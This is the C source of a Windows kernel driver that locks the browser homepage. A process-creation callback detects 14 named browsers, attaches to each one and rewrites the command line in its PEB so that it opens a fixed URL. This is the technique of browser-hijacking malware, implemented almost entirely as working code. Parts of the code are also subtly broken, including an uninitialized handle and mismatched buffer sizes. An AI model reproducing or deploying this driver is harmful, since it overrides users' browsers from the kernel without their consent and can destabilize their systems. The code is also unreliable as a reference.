#include <ntifs.h>
#include <ntstrsafe.h>
//#include <ntddk.h>
#include <wdm.h>
#include "PBCStr.h"

#define DevcieName L"\\device\\PBCLockHomePage"
#define SymbolicName L"\\dosDevices\\PBCLockHomePage"

#define PsGetProcessPebName L"PsGetProcessPeb"
#define PsIsProtectedProcessName L"PsIsProtectedProcess"


extern NTSTATUS ZwQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInfoClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

typedef PPEB(__stdcall *PSGETPROCESSPEB)(PEPROCESS pEprocess);
typedef BOOLEAN(__stdcall *PSISPROTECTEDPROCESS)(PEPROCESS pEprocess);

PSGETPROCESSPEB PsGetProcessPeb = NULL;
PSISPROTECTEDPROCESS PsIsProtectedProcess = NULL;

//是否可以提权，可以返回非0，否则返回0
ULONG GetTargetProcessToken( HANDLE ProcessId,  PVOID lpOutputBuffer)
{
	PEPROCESS pEprocess = NULL;
	NTSTATUS ntStatus = STATUS_SUCCESS;
	PACCESS_TOKEN lpAccessToken = NULL;
	TOKEN_ELEVATION tokenElevation = {0x00};
	ULONG dwresult = 0;

	ntStatus = PsLookupProcessByProcessId(ProcessId, &pEprocess);
	if (!NT_SUCCESS(ntStatus))
	{
		DbgPrint("PsLookupProcessByProcessId faild!\n");
		goto ret;
	}

	lpAccessToken = PsReferencePrimaryToken(pEprocess);
	if (!lpAccessToken)
	{
		DbgPrint("PsReferencePrimaryToken faild!\n");
		ntStatus = STATUS_INVALID_PARAMETER;
		goto ret;
	}

	ntStatus = SeQueryInformationToken(lpAccessToken, TokenElevation, &tokenElevation);
	if (!NT_SUCCESS(ntStatus))
	{
		DbgPrint("SeQueryInformationToken faild!\n");
		goto ret;
	}

ret:
	{
		if (pEprocess)
		{
			ObfDereferenceObject(pEprocess);
		}
		if (lpAccessToken)
		{
			PsDereferencePrimaryToken(lpAccessToken);
		}
	}
	dwresult = ntStatus == STATUS_SUCCESS ? tokenElevation.TokenIsElevated : 0;

	return dwresult;
}

BOOL IsExplorer(PUNICODE_STRING lpProcessName)
{
	UNICODE_STRING uExplorerNames = {0x00};
	ULONG loopIndex;

	WCHAR *aExplorerNameBuffer[0x0e] = {L"iexplore"
		,L"360se"
		,L"MicrosoftEdgeCP"
		,L"MicrosoftEdge"
		,L"chrome"
		,L"firefox"
		,L"liebao"
		,L"opera"
		,L"QQBrowser"
		,L"SogouExplorer"
		,L"baidubrowser"
		,L"Maxthon"
		,L"2345Explorer"
		,L"Safari"};

	for (loopIndex = 0; loopIndex < 0x0e; ++loopIndex)
	{
		RtlInitUnicodeString(&uExplorerNames, aExplorerNameBuffer[loopIndex]);

		if (PBCUniCodeStrStr(lpProcessName, &uExplorerNames))
		{
			return TRUE;
		}
	}
	
	return FALSE;

}

NTSTATUS IsProtectedProcess(HANDLE ProcessId
	, PUNICODE_STRING pDesProcessName)
{
	KIRQL kIrql;
	NTSTATUS ntStatus = STATUS_SUCCESS;
	PEPROCESS pEprocess = NULL;

	if (!ProcessId)
	{
		ntStatus = STATUS_INVALID_PARAMETER;
		goto ret;
	}

	kIrql = KeGetCurrentIrql();
	if (kIrql >= DISPATCH_LEVEL)
	{
		ntStatus = STATUS_INVALID_LEVEL;
		goto ret;
	}

	ntStatus = PsLookupProcessByProcessId(ProcessId
		, &pEprocess);
	if (!NT_SUCCESS(ntStatus))
	{
		goto ret;
	}

	 
	if (!PsIsProtectedProcess(pEprocess))
	{
		ntStatus = STATUS_SUCCESS;
		goto ret;
	}

	//KeWaitForSingleObject(,);
	DbgPrint("Current Process is Protected!\n");

ret:
	{
		if (pEprocess)
		{
			ObDereferenceObject(pEprocess);
		}
		return ntStatus;
	}
}

ULONG GetProcessNameByPid(HANDLE ProcessId
	, PUNICODE_STRING pDesProcessName)
{
	HANDLE hProcess;
	PEPROCESS pEprocess = NULL;
	NTSTATUS ntStatus = STATUS_SUCCESS;
	ULONG dwProcessNameRealLen = 0;
	
	FILE_NAME_INFORMATION *lpFileNameInfo = NULL;
	PsLookupProcessByProcessId(ProcessId,&pEprocess);

	ntStatus = ObOpenObjectByPointer(pEprocess
	,0x200
	,0
	,0
	,NULL
	,KernelMode
	,&hProcess);

	if (!NT_SUCCESS(ntStatus))
	{
		DbgPrint("ObOpenObjectByPointer faild!\n");
		return ntStatus;
	}

	//__try
	{
		//KeAttachProcess(hProcess);

		ntStatus = ZwQueryInformationProcess(hProcess
			, ProcessImageFileName
			, NULL
			, NULL
			, &dwProcessNameRealLen);
		if (ntStatus != STATUS_INFO_LENGTH_MISMATCH)
		{
			DbgPrint("ZwQueryInformationProcess faild!\n");
			ntStatus = STATUS_MEMORY_NOT_ALLOCATED;
			//__leave;
			goto ret;
		}

		lpFileNameInfo = ExAllocatePoolWithTag(PagedPool, dwProcessNameRealLen, "NORP");
		if (!lpFileNameInfo)
		{
			DbgPrint("ExAllocatePoolWithTag faild!\n");
			ntStatus = STATUS_MEMORY_NOT_ALLOCATED;
			//__leave;
			goto ret;
		}

		ntStatus = ZwQueryInformationProcess(hProcess
			, ProcessImageFileName
			, lpFileNameInfo
			, dwProcessNameRealLen
			, &dwProcessNameRealLen);
		if (ntStatus == STATUS_INFO_LENGTH_MISMATCH)
		{
			DbgPrint("ZwQueryInformationProcess faild!\n");
			ntStatus = STATUS_MEMORY_NOT_ALLOCATED;
			//__leave;
			goto ret;
		}

		(*pDesProcessName).MaximumLength = (*pDesProcessName).Length = dwProcessNameRealLen;
		(*pDesProcessName).Buffer = ExAllocatePoolWithTag(PagedPool, sizeof(UNICODE_STRING) + sizeof(WCHAR) * dwProcessNameRealLen, "pter");
		//RtlCopyMemory(pDesProcessName->Buffer,(WCHAR *)lpFileNameInfo->FileName,sizeof(WCHAR) * dwProcessNameRealLen);
		RtlCopyUnicodeString(pDesProcessName, (PUNICODE_STRING)lpFileNameInfo);
	}

	ret:
	{
		if (hProcess)
		{
			ZwClose(hProcess);
		}
		if (pEprocess)
		{
			ObDereferenceObject(pEprocess);
		}
	}
	
	return ntStatus;

}

VOID CreateProcessCallBack( HANDLE ParentId
	,  HANDLE ProcessId
	,  BOOLEAN Create)
{
	KIRQL kCurrentIrql;
	UNICODE_STRING uProcessName = {0x00};
	UNICODE_STRING uHomePageUrlStr = {0x00};
	NTSTATUS ntStatus = STATUS_SUCCESS;
	UNICODE_STRING uCompStr = {0x00};
	PPEB pPeb = NULL;
	PEPROCESS pEprocess = NULL;
	UNICODE_STRING uCommandLineBuffer = {0x00};
	KAPC_STATE pKapcState = { 0X00 };
	NTSTRSAFE_PCWSTR lpHomePageUrlStr = L"\" https://www.pediy.com";
	ULONG dwEvelatedId = 0;
	ULONG dwScodeIndex = 0;
	ULONG dwUrlIndex = 0;
	UNICODE_STRING uScodefStr = {0x00};
	
	kCurrentIrql = KeGetCurrentIrql();
	if (kCurrentIrql >= DISPATCH_LEVEL)
	{
		//如果当前irql大于等于DISPATCH_LEVEL时，直接返回
		return;
	}


	ntStatus = GetProcessNameByPid(ProcessId, &uProcessName);
	if (!NT_SUCCESS(ntStatus))
	{
		ntStatus = IsProtectedProcess(ProcessId,&uProcessName);
		if (!NT_SUCCESS(ntStatus))
		{
			goto ret;
		}

	}

	//DbgPrint("Process Name is %wZ!\n", &uProcessName);
	RtlInitUnicodeString(&uCompStr, L".exe");
	
	if (PBCUniCodeStrStr(&uProcessName, &uCompStr))
	{
		//comp explotss
		if (!IsExplorer(&uProcessName))
		{
			goto ret;
		}

		//DbgPrint("Current Open Process is Explore!\n");
		ntStatus = PsLookupProcessByProcessId(ProcessId, &pEprocess);
		if (!NT_SUCCESS(ntStatus))
		{
			DbgPrint("PsLookupProcessByProcessId faild!\n");
			goto ret;
		}

		if (!PsGetProcessPeb)
		{
			DbgPrint("Not Get PsGetProcessPeb func address!\n");
			ntStatus = STATUS_INVALID_PARAMETER;
			goto ret;
		}
		__try
		{
			KeStackAttachProcess(pEprocess, &pKapcState);

			pPeb = PsGetProcessPeb(pEprocess);
			if (!pPeb)
			{
				DbgPrint("PsGetProcessPeb faild!\n");
				ntStatus = STATUS_INVALID_PARAMETER;
				__leave;
			}

			//DbgPrint("Find ProcessPeb address:0x%x\n", (ULONG)pPeb);
			DbgPrint("Old CommandLineBuffer is %wZ\n", &pPeb->ProcessParameters->CommandLine);
			
			if (!pPeb->ProcessParameters)
			{
				ntStatus = STATUS_INVALID_PARAMETER;
				__leave;
			}

			dwEvelatedId = GetTargetProcessToken(ProcessId, NULL);
			if (!dwEvelatedId)
			{
				
			}


			uCommandLineBuffer.Buffer = ExAllocatePoolWithTag(NonPagedPool, pPeb->ProcessParameters->ImagePathName.Length + (wcslen(lpHomePageUrlStr) * sizeof(wchar_t)) + sizeof(wchar_t),"BIL");//4c4942h
			if (!uCommandLineBuffer.Buffer)
			{
				ntStatus = STATUS_INSUFFICIENT_RESOURCES;
				__leave;
			}

			uCommandLineBuffer.MaximumLength = pPeb->ProcessParameters->ImagePathName.Length + (wcslen(lpHomePageUrlStr) * sizeof(wchar_t)) + sizeof(wchar_t);
			RtlZeroMemory(uCommandLineBuffer.Buffer,uCommandLineBuffer.MaximumLength);
			RtlCopyMemory(uCommandLineBuffer.Buffer,L"\"",sizeof(wchar_t));

			RtlCopyMemory(uCommandLineBuffer.Buffer + 1 ,pPeb->ProcessParameters->ImagePathName.Buffer,pPeb->ProcessParameters->ImagePathName.Length);
			uCommandLineBuffer.Length = pPeb->ProcessParameters->ImagePathName.Length + sizeof(wchar_t);

			ntStatus = RtlUnicodeStringCbCatStringN(&uCommandLineBuffer, lpHomePageUrlStr, wcslen(lpHomePageUrlStr) * sizeof(wchar_t));
			if (!NT_SUCCESS(ntStatus))
			{
				DbgPrint("RtlUnicodeStringCbCatString faild:0x%x!\n", ntStatus);
				__leave;
			}
			
			//如果没有其他参数
			//CommandLine的长度比ImagePathName的长度多6字节("" )
			//则直接覆盖
			if (pPeb->ProcessParameters->CommandLine.Length - pPeb->ProcessParameters->ImagePathName.Length <= 6)
			{
				pPeb->ProcessParameters->CommandLine.Length = uCommandLineBuffer.Length;
				pPeb->ProcessParameters->CommandLine.MaximumLength = pPeb->ProcessParameters->CommandLine.Length + sizeof(wchar_t);
				RtlCopyMemory(pPeb->ProcessParameters->CommandLine.Buffer, uCommandLineBuffer.Buffer, uCommandLineBuffer.MaximumLength);
			}
			//如果还有其他参数，则将SCODEF后面的拷贝出来
			else
			{
				//如果有SCODEF
				if (PBCIsHaveCreateCode(pPeb, &dwScodeIndex))
				{
					DbgPrint("1\n");
					uScodefStr.Buffer = ExAllocatePoolWithTag(NonPagedPool
						, pPeb->ProcessParameters->CommandLine.Length - ((dwScodeIndex + sizeof(wchar_t)) * sizeof(wchar_t))
					,"DOCS");
					uScodefStr.Length = 0;
					uScodefStr.MaximumLength = pPeb->ProcessParameters->CommandLine.Length - dwScodeIndex * sizeof(wchar_t);
					if (!uScodefStr.Buffer)
					{
						__leave;
					}
					
					RtlCopyMemory(uScodefStr.Buffer,pPeb->ProcessParameters->CommandLine.Buffer + dwScodeIndex,uScodefStr.MaximumLength);
					uScodefStr.Length = uScodefStr.MaximumLength;
					*(uScodefStr.Buffer + (uScodefStr.Length/sizeof(wchar_t))) = '\0';
					
					//先覆盖，再修改长度
					RtlCopyMemory(pPeb->ProcessParameters->CommandLine.Buffer + dwScodeIndex,uScodefStr.Buffer,uScodefStr.Length);
					pPeb->ProcessParameters->CommandLine.Length += uScodefStr.Length;
					pPeb->ProcessParameters->CommandLine.MaximumLength += uScodefStr.Length;
				}
				else
				{
					//如果没有SCODEF，包含url，则将url替换为锁定的url
					if (PBCIsHaveUrl(pPeb,&dwUrlIndex))
					{
						pPeb->ProcessParameters->CommandLine.Length = uCommandLineBuffer.Length;
						pPeb->ProcessParameters->CommandLine.MaximumLength = pPeb->ProcessParameters->CommandLine.Length + sizeof(wchar_t);
						RtlCopyMemory(pPeb->ProcessParameters->CommandLine.Buffer, uCommandLineBuffer.Buffer, uCommandLineBuffer.MaximumLength);
					}
					
				}
			}

			//最后要拼接'\0'
			*(pPeb->ProcessParameters->CommandLine.Buffer + pPeb->ProcessParameters->CommandLine.Length / sizeof(wchar_t)) = '\0';

			DbgPrint("New CommandLineBuffer is %wZ!\n", &pPeb->ProcessParameters->CommandLine);
			__leave;
		}
		__finally
		{
			KeUnstackDetachProcess(&pKapcState);
			if (uCommandLineBuffer.Buffer)
			{
				ExFreePool(uCommandLineBuffer.Buffer);
				uCommandLineBuffer.Buffer = NULL;
			}
		}
		
	}

	ret:
	if (uProcessName.Buffer)
	{
		ExFreePool(uProcessName.Buffer);
	}
	if (pEprocess)
	{
		ObDereferenceObject(pEprocess);
	}
	
}

NTSTATUS DispatchCommon(PDEVICE_OBJECT pDeviceObj, PIRP pIrp)
{
	NTSTATUS ntStatus = STATUS_SUCCESS;
	pIrp->IoStatus.Status = ntStatus;
	pIrp->IoStatus.Information = 0;
	
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	
	return ntStatus;
}

VOID DriverUnload(PDRIVER_OBJECT pDriObj)
{
	UNICODE_STRING uSymbolicName = {0x00};

	//根据文档说明：一定要在卸载驱动前remove已注册回调
	PsSetCreateProcessNotifyRoutine(CreateProcessCallBack, TRUE);

	RtlInitUnicodeString(&uSymbolicName, SymbolicName);
	IoDeleteSymbolicLink(&uSymbolicName);

	IoDeleteDevice(pDriObj->DeviceObject);

	DbgPrint("PBCLockHomePage is UnInstall!\n");
}

VOID GetNotExportFunctions(VOID)
{
	UNICODE_STRING uFuncsName = {0x00};
	RtlInitUnicodeString(&uFuncsName, PsGetProcessPebName);
	PsGetProcessPeb = (PSGETPROCESSPEB)MmGetSystemRoutineAddress(&uFuncsName);

	RtlInitUnicodeString(&uFuncsName, PsIsProtectedProcessName);
	PsIsProtectedProcess = (PSISPROTECTEDPROCESS)MmGetSystemRoutineAddress(&uFuncsName);

}

NTSTATUS DriverEntry( PDRIVER_OBJECT pDriverObj,  PUNICODE_STRING pDriverPath)
{
	NTSTATUS ntStatus = STATUS_SUCCESS;
	UNICODE_STRING uDeviceName = {0x00};
	UNICODE_STRING uSymbolicName = {0x00};
	DEVICE_OBJECT deviceObject = {0x00};
	ULONG dwMJFunctionIndex;

	RtlInitUnicodeString(&uDeviceName, DevcieName);
	ntStatus = IoCreateDevice(pDriverObj
		, 0
		, &uDeviceName
		, FILE_DEVICE_UNKNOWN
		, 0
		, FALSE
		, &deviceObject);
	if (!NT_SUCCESS(ntStatus))
	{
		DbgPrint("IoCreateDevice faild!\n");
		return ntStatus;
	}

	RtlInitUnicodeString(&uSymbolicName, SymbolicName);
	ntStatus = IoCreateSymbolicLink(&uSymbolicName, &uDeviceName);
	if (!NT_SUCCESS(ntStatus))
	{
		DbgPrint("IoCreateSymbolicLink faild!\n");
		return ntStatus;
	}

	pDriverObj->Flags |= DO_BUFFERED_IO;

	for (dwMJFunctionIndex = 0; dwMJFunctionIndex < IRP_MJ_MAXIMUM_FUNCTION; ++dwMJFunctionIndex)
	{
		pDriverObj->MajorFunction[dwMJFunctionIndex] = DispatchCommon;
	}
	
	pDriverObj->DriverUnload = DriverUnload;

	GetNotExportFunctions();

	PsSetCreateProcessNotifyRoutine(CreateProcessCallBack, FALSE);

	return ntStatus;

}